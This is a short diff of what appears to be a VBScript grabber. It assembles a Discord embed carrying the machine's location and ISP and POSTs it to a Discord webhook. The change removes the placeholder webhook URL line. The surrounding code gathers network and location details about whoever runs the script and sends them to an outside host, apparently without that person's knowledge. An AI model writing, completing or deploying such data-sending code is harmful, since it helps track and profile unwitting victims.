@@ -74,9 +74,6 @@ postData = postData & "{""name"":""Location"",""value"":""" & city & ", " & regi
 postData = postData & "{""name"":""ISP"",""value"":""" & isp & """,""inline"":false}"
 postData = postData & "]}]}"
 
-' Set up the webhook URL - replace YOUR_WEBHOOK_URL with the actual webhook URL
-webhookUrl = "YOUR_WEBHOOK_URL"
-
 ' Send the POST request to the Discord webhook
 Set xhr = CreateObject("MSXML2.XMLHTTP")
 xhr.Open "POST", webhookUrl, False
